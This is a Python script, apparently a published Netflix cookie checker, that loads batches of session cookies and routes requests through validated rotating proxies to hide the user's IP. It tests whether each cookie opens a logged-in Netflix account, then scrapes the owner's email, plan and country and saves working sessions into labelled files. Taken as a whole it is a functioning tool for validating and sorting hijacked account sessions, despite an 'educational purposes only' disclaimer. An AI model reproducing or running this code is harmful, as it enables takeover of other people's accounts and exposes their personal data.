import json
import hashlib
import os
import re
import sys
import time
import requests
import tkinter as tk
from tkinter import filedialog
from urllib.parse import urlparse
from requests.exceptions import RequestException, ConnectionError
from http.client import RemoteDisconnected
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# ─────────────────────────────────────────────────────────────────────────────
# Init
# ─────────────────────────────────────────────────────────────────────────────
init()

BANNER = f"""{Fore.RED}
  _   _      _    __ _ _
 | \\ | | ___| |_ / _| (_)_  __
 |  \\| |/ _ \\ __| |_| | \\ \\/ /
 | |\\  |  __/ |_|  _| | |>  <
 |_| \\_|\\___|\\__|_| |_|_/_/\\_\\
{Fore.YELLOW}      Cookie Checker — https://github.com/matheeshapathirana/Netflix-cookie-checker
{Style.RESET_ALL}"""

print(BANNER)
print(Fore.YELLOW + "Initializing, please wait...\n" + Fore.RESET)

# ─────────────────────────────────────────────────────────────────────────────
# Global state
# ─────────────────────────────────────────────────────────────────────────────
working_cookies_path = "working_cookies"
exceptions = 0
working_cookies = 0
expired_cookies = 0
duplicate_cookies = 0
extra_memberships = 0
start = time.time()

plan = None
email = None
info = None
extra_members = None
country = None

lock = Lock()
num_threads = 10  # Define the maximum number of threads here

# ───────────────────────────────────────────────────────
# | Network Speed  | Recommended threads                |
# |----------------|-------------------------------------|
# | < 5 Mbps       | 1-3                                |
# | 5-20 Mbps      | 3-5                                |
# | 20-100 Mbps    | 5-10                               |
# | > 100 Mbps     | 10-20                              |
# ───────────────────────────────────────────────────────

max_retries = 3  # Define the maximum number of retries

# Proxy globals (populated during setup)
valid_proxies: list = []  # list of {"http": url, "https": url}
proxy_index = 0
USE_PROXY = False
seen_cookie_fingerprints: set[str] = set()


# ─────────────────────────────────────────────────────────────────────────────
# Extraction helpers
# ─────────────────────────────────────────────────────────────────────────────

def decode_hex_escapes(s: str) -> str:
    """Decode \\xNN and \\uNNNN escape sequences safely."""
    if not s:
        return s
    s = re.sub(r'\\x([0-9A-Fa-f]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9A-Fa-f]{4})', lambda m: chr(int(m.group(1), 16)), s)
    return s


def extract_info(response_text: str) -> dict:
    """
    Pull plan, email, and country directly from the embedded
    reactContext JSON blob that Netflix inlines in every page.
    """
    patterns = {
        # "localizedPlanName":{"fieldType":"String","value":"Standard"}
        "localizedPlanName": (
            r'"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,'
            r'\s*"value"\s*:\s*"([^"]+)"'
        ),
        # "emailAddress":"user\x40gmail.com"
        "emailAddress": r'"emailAddress"\s*:\s*"([^"]+)"',
        # "countryOfSignup":"BE"
        "countryOfSignup": r'"countryOfSignup"\s*:\s*"([^"]+)"',
    }
    result = {}
    for key, pat in patterns.items():
        m = re.search(pat, response_text)
        result[key] = decode_hex_escapes(m.group(1)) if m else None
    return result


def load_cookies_from_json(path: str) -> list:
    with open(path, "r", encoding="utf-8") as f:
        return json.load(f)


def cookie_fingerprint(cookies: list) -> str:
    """
    Build a stable fingerprint from actual cookie entries only.
    Metadata rows appended by this checker do not include name/value, so they
    are ignored and will not change duplicate detection.
    """
    parts = []
    for cookie in cookies:
        if not isinstance(cookie, dict) or "name" not in cookie or "value" not in cookie:
            continue
        domain = str(cookie.get("domain", "")).lower()
        path = str(cookie.get("path", ""))
        name = str(cookie.get("name", ""))
        value = str(cookie.get("value", ""))
        parts.append(f"{domain}\t{path}\t{name}\t{value}")
    if not parts:
        return ""
    payload = "\n".join(sorted(parts))
    return hashlib.sha256(payload.encode("utf-8")).hexdigest()


def load_cookie_fingerprints(folder: str) -> set[str]:
    fingerprints = set()
    if not os.path.isdir(folder):
        return fingerprints

    for filename in os.listdir(folder):
        path = os.path.join(folder, filename)
        if not os.path.isfile(path):
            continue
        try:
            fingerprint = cookie_fingerprint(load_cookies_from_json(path))
            if fingerprint:
                fingerprints.add(fingerprint)
        except Exception:
            pass
    return fingerprints


def proxy_label(proxies: dict | None) -> str:
    if not proxies:
        return "n/a"
    return proxies.get("https") or proxies.get("http") or "n/a"


def is_netflix_account_url(url: str) -> bool:
    """Netflix redirects valid /YourAccount sessions to /account."""
    parsed = urlparse(url)
    host = parsed.netloc.lower()
    path = parsed.path.rstrip("/").lower()
    return host.endswith("netflix.com") and path == "/account"


def is_netflix_login_url(url: str) -> bool:
    """Expired cookies are redirected to a localized /login URL."""
    parsed = urlparse(url)
    host = parsed.netloc.lower()
    path = parsed.path.rstrip("/").lower()
    return host.endswith("netflix.com") and path.endswith("/login")


def is_netflix_browse_url(url: str) -> bool:
    """Working subscribed cookies should be able to reach /browse."""
    parsed = urlparse(url)
    host = parsed.netloc.lower()
    path = parsed.path.rstrip("/").lower()
    return host.endswith("netflix.com") and path.startswith("/browse")


# ─────────────────────────────────────────────────────────────────────────────
# Proxy utilities
# ─────────────────────────────────────────────────────────────────────────────

def get_next_proxy() -> dict | None:
    """Return next proxy via round-robin (thread-safe)."""
    global proxy_index
    if not valid_proxies:
        return None
    with lock:
        p = valid_proxies[proxy_index % len(valid_proxies)]
        proxy_index += 1
    return p


def ask_yes_no(prompt: str) -> bool:
    while True:
        ans = input(prompt + " [y/n]: ").strip().lower()
        if ans in ("y", "yes"):
            return True
        if ans in ("n", "no"):
            return False
        print(Fore.RED + "  Please enter y or n." + Fore.RESET)


def pick_proxy_file() -> str | None:
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    path = filedialog.askopenfilename(
        title="Select proxy file",
        filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
    )
    root.destroy()
    return path or None


def pick_proxy_type() -> str:
    options = {"1": "http", "2": "https", "3": "socks4", "4": "socks5"}
    print(Fore.CYAN + "\nSelect proxy type:" + Fore.RESET)
    for k, v in options.items():
        print(f"  [{k}] {v.upper()}")
    while True:
        choice = input("  Enter number (1-4): ").strip()
        if choice in options:
            return options[choice]
        print(Fore.RED + "  Invalid choice, try again." + Fore.RESET)


def parse_proxy_line(line: str, proxy_type: str) -> str | None:
    """
    Parse a proxy line in any of these formats:
      host:port
      host:port:user:pass
      user:pass@host:port
    Returns a full proxy URL or None if un-parseable.
    """
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if "@" in line:
        return f"{proxy_type}://{line}"
    parts = line.split(":")
    if len(parts) == 2:
        return f"{proxy_type}://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        host, port, user, passwd = parts
        return f"{proxy_type}://{user}:{passwd}@{host}:{port}"
    return None


def validate_proxy(proxy_url: str, timeout: int = 8) -> bool:
    proxies = {"http": proxy_url, "https": proxy_url}
    try:
        with requests.Session() as session:
            session.trust_env = False
            r = session.get("https://www.google.com", proxies=proxies, timeout=timeout)
        return r.status_code < 500
    except Exception:
        return False


def load_and_validate_proxies(filepath: str, proxy_type: str) -> list:
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        raw_lines = f.readlines()

    proxy_urls = [u for u in (parse_proxy_line(l, proxy_type) for l in raw_lines) if u]

    if not proxy_urls:
        print(Fore.RED + "[⚠️]  No parseable proxies found in the file." + Fore.RESET)
        return []

    print(
        Fore.YELLOW
        + f"\n[🔍] Validating {len(proxy_urls)} proxies, please wait..."
        + Fore.RESET
    )

    good = []
    bad_count = 0
    c_lock = Lock()

    def _check(url: str):
        nonlocal bad_count
        ok = validate_proxy(url)
        with c_lock:
            if ok:
                good.append({"http": url, "https": url})
                print(Fore.GREEN + f"  [✔] LIVE  — {url}" + Fore.RESET)
            else:
                bad_count += 1
                print(Fore.RED + f"  [✘] DEAD  — {url}" + Fore.RESET)

    with ThreadPoolExecutor(max_workers=min(20, len(proxy_urls))) as ex:
        for _ in as_completed([ex.submit(_check, u) for u in proxy_urls]):
            pass

    print(
        Fore.YELLOW + f"\n[📊] Proxy validation done — "
        + Fore.GREEN + f"{len(good)} live"
        + Fore.YELLOW + " / "
        + Fore.RED + f"{bad_count} dead"
        + Fore.RESET + "\n"
    )
    return good


# ─────────────────────────────────────────────────────────────────────────────
# Proxy setup entry-point
# ─────────────────────────────────────────────────────────────────────────────

def setup_proxies():
    global valid_proxies, USE_PROXY

    if not ask_yes_no(Fore.CYAN + "Do you want to use proxies?" + Fore.RESET):
        print(Fore.YELLOW + "[ℹ️]  Running without proxies.\n" + Fore.RESET)
        return

    print(Fore.CYAN + "\n[📂] A file picker will open — select your proxy list..." + Fore.RESET)
    proxy_file = pick_proxy_file()
    if not proxy_file:
        print(Fore.RED + "[⚠️]  No file selected. Proxy mode cancelled; stopping to protect your real IP.\n" + Fore.RESET)
        sys.exit(1)

    print(Fore.GREEN + f"[✔]  Proxy file : {proxy_file}" + Fore.RESET)

    proxy_type = pick_proxy_type()
    print(Fore.GREEN + f"[✔]  Proxy type : {proxy_type.upper()}\n" + Fore.RESET)

    validated = load_and_validate_proxies(proxy_file, proxy_type)
    if not validated:
        print(Fore.RED + "[⚠️]  No live proxies found. Stopping to protect your real IP.\n" + Fore.RESET)
        sys.exit(1)

    valid_proxies = validated
    USE_PROXY = True
    print(Fore.GREEN + f"[✔]  {len(valid_proxies)} live proxies loaded. Proxy mode ON.\n" + Fore.RESET)


# ─────────────────────────────────────────────────────────────────────────────
# Core cookie checker
# ─────────────────────────────────────────────────────────────────────────────

def open_webpage_with_cookies(session, link: str, json_cookies: list, filename: str) -> bool:
    global working_cookies, expired_cookies, plan, email, duplicate_cookies
    global info, extra_memberships, extra_members, country

    session.cookies.clear()
    session.trust_env = False
    for cookie in json_cookies:
        session.cookies.set(cookie["name"], cookie["value"])

    session.headers.update({"Accept-Encoding": "identity"})

    # Assign a proxy for this session
    if USE_PROXY:
        proxy = get_next_proxy()
        if proxy:
            session.proxies.update(proxy)

    attempt = 0
    while attempt < max_retries:
        try:
            request_proxies = dict(session.proxies) if USE_PROXY else None
            response = session.get(link, timeout=20, allow_redirects=True, proxies=request_proxies)
            response.raise_for_status()
            if not is_netflix_account_url(response.url):
                with lock:
                    reason = "redirected to login" if is_netflix_login_url(response.url) else f"ended at {response.url}"
                    proxy_tag = f" | Proxy: {proxy_label(request_proxies)}" if USE_PROXY else ""
                    print(Fore.RED + f"[❌] Cookie not working — {filename} ({reason}){proxy_tag}" + Fore.RESET)
                    expired_cookies += 1
                return False

            browse_resp = session.get(
                "https://www.netflix.com/browse",
                timeout=20,
                allow_redirects=True,
                proxies=request_proxies,
            )
            browse_resp.raise_for_status()
            if not is_netflix_browse_url(browse_resp.url):
                with lock:
                    reason = f"browse redirected to {browse_resp.url}"
                    proxy_tag = f" | Proxy: {proxy_label(request_proxies)}" if USE_PROXY else ""
                    print(Fore.RED + f"[❌] Cookie not working — {filename} ({reason}){proxy_tag}" + Fore.RESET)
                    expired_cookies += 1
                return False

            content = response.text
            info = extract_info(content)
            soup = BeautifulSoup(content, "lxml")

            # Extra-membership probe
            em_resp = session.get(
                "https://www.netflix.com/accountowner/addextramember",
                allow_redirects=False,
                timeout=20,
                proxies=request_proxies,
            )
            if em_resp.status_code == 200:
                extra_memberships += 1
                extra_members = True
            else:
                extra_members = False

            # ── Plan ──────────────────────────────────────────────────────
            raw_plan = info.get("localizedPlanName")
            if raw_plan:
                plan = raw_plan.replace("miembro\xa0extra", "(Shared Extra Member)")
            else:
                page_text = soup.get_text()
                for candidate in ("Premium", "Standard", "Basic"):
                    if candidate in page_text:
                        plan = candidate
                        break
                else:
                    plan = "Unknown"

            # ── Email ─────────────────────────────────────────────────────
            raw_email = info.get("emailAddress")
            if raw_email:
                email = raw_email
            else:
                el = soup.select_one(".account-section-email")
                email = el.text.strip() if el else "Unknown"

            # ── Country ───────────────────────────────────────────────────
            country = info.get("countryOfSignup") or "Unknown"

            os.makedirs(working_cookies_path, exist_ok=True)
            return True

        except (RequestException, ConnectionError, RemoteDisconnected) as e:
            with lock:
                print(
                    Fore.RED
                    + f"[⚠️] Request error: {e!s} — {filename} "
                    + f"(attempt {attempt + 1}/{max_retries})"
                    + (f" | Proxy: {proxy_label(session.proxies)}" if USE_PROXY else "")
                    + Fore.RESET
                )
            attempt += 1
            # Rotate proxy on retry
            if USE_PROXY:
                proxy = get_next_proxy()
                if proxy:
                    session.proxies.update(proxy)
            time.sleep(1)

    with lock:
        print(Fore.RED + f"[❌] Failed after {max_retries} attempts — {filename}" + Fore.RESET)
    return False


def process_cookie_file(filename: str):
    global duplicate_cookies, working_cookies, exceptions, extra_memberships

    filepath = os.path.join("json_cookies", filename)
    if not os.path.isfile(filepath):
        return

    url = "https://www.netflix.com/YourAccount"
    try:
        cookies = load_cookies_from_json(filepath)
        fingerprint = cookie_fingerprint(cookies)
        with requests.Session() as session:
            if open_webpage_with_cookies(session, url, cookies, filename):
                meta = {
                    "_comment": "Cookie checked by https://github.com/matheeshapathirana/Netflix-cookie-checker",
                    "Credits": "Matheesha Pathirana",
                    "Discord Server": "https://discord.gg/RSCdKeKB5X",
                    "Special Thanks": "To all contributors who have helped improve this project",
                    "Disclaimer": "This project is for educational purposes only.",
                    "Support": "Star the project on GitHub or contribute to keep it alive!",
                }
                cookies.append(meta)

                # Sanitize email for use in filename
                safe_email = re.sub(r'[<>:"/\\|?*]', '_', email or "unknown")
                suffix = " - Extra Membership" if extra_members else ""
                out_name = f"[{country}] [{safe_email}] - {plan}{suffix}.json"
                out_path = os.path.join(working_cookies_path, out_name)

                with lock:
                    if (fingerprint and fingerprint in seen_cookie_fingerprints) or os.path.isfile(out_path):
                        print(
                            Fore.YELLOW
                            + f"[⚠️] Duplicate — {filename} | Plan: {plan} | Email: {email}"
                            + Fore.RESET
                        )
                        duplicate_cookies += 1
                    else:
                        with open(out_path, "w", encoding="utf-8") as jf:
                            json.dump(cookies, jf, indent=4)
                        if fingerprint:
                            seen_cookie_fingerprints.add(fingerprint)
                        working_cookies += 1
                        proxy_tag = (
                            f" | Proxy: {session.proxies.get('http', 'n/a')}"
                            if USE_PROXY else ""
                        )
                        print(
                            Fore.GREEN
                            + f"[✔️] Working — [{country}] {filename} | "
                            + f"Plan: {plan} | Email: {email} | "
                            + f"Extra: {extra_members}{proxy_tag}"
                            + Fore.RESET
                        )

    except json.decoder.JSONDecodeError:
        with lock:
            print(
                Fore.RED
                + f"[⚠️] Invalid JSON — use cookie_converter.py to fix ({filename})"
                + Fore.RESET
            )
            exceptions += 1

    except Exception as e:
        with lock:
            print(Fore.RED + f"[⚠️] Error: {e!s} — {filename}" + Fore.RESET)
            exceptions += 1


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────

def main():
    global seen_cookie_fingerprints

    # 1. Proxy setup (ask, file-pick, validate) before any checking starts
    setup_proxies()

    # 2. Verify cookie directory
    cookie_dir = "json_cookies"
    if not os.path.isdir(cookie_dir):
        print(
            Fore.RED
            + "[⚠️] 'json_cookies' directory not found.\n"
            + "     Create it and place your JSON cookies inside, then re-run."
            + Fore.RESET
        )
        sys.exit(1)

    files = [f for f in os.listdir(cookie_dir) if os.path.isfile(os.path.join(cookie_dir, f))]
    if not files:
        print(
            Fore.RED
            + "[⚠️] 'json_cookies' is empty.\n"
            + "     Use cookie_converter.py to convert your cookies first."
            + Fore.RESET
        )
        sys.exit(1)

    seen_cookie_fingerprints = load_cookie_fingerprints(working_cookies_path)

    if os.path.isdir(working_cookies_path):
        print(
            Fore.YELLOW
            + "[ℹ️]  'working_cookies' already exists — new results will be appended.\n"
            + Fore.RESET
        )

    proxy_info = (
        f"ON ({len(valid_proxies)} live)" if USE_PROXY else "OFF"
    )
    print(
        Fore.CYAN
        + f"[🚀] Starting — {len(files)} cookie(s) | "
        + f"threads: {num_threads} | proxy: {proxy_info}\n"
        + Fore.RESET
    )

    # 3. Run checker
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        executor.map(process_cookie_file, files)


try:
    main()
    end = time.time()
    elapsed = round(end - start)

    cookie_dir = "json_cookies"
    total = len(os.listdir(cookie_dir)) if os.path.isdir(cookie_dir) else 0
    proxy_summary = (
        f"Yes ({len(valid_proxies)} live)" if USE_PROXY else "No"
    )

    print(
        Fore.YELLOW
        + "\n==================================="
        + f"\n  Summary"
        + f"\n  Total cookies      : {total}"
        + f"\n  Working cookies    : {working_cookies}"
        + f"\n  Extra memberships  : {extra_memberships}"
        + f"\n  Expired cookies    : {expired_cookies}"
        + f"\n  Duplicate cookies  : {duplicate_cookies}"
        + f"\n  Errors / invalid   : {exceptions}"
        + f"\n  Proxies used       : {proxy_summary}"
        + f"\n  Time elapsed       : {elapsed}s"
        + "\n==================================="
        + Fore.RESET
    )
except KeyboardInterrupt:
    print(Fore.RED + "\n[⚠️] Interrupted by user." + Fore.RESET)
    sys.exit(0)
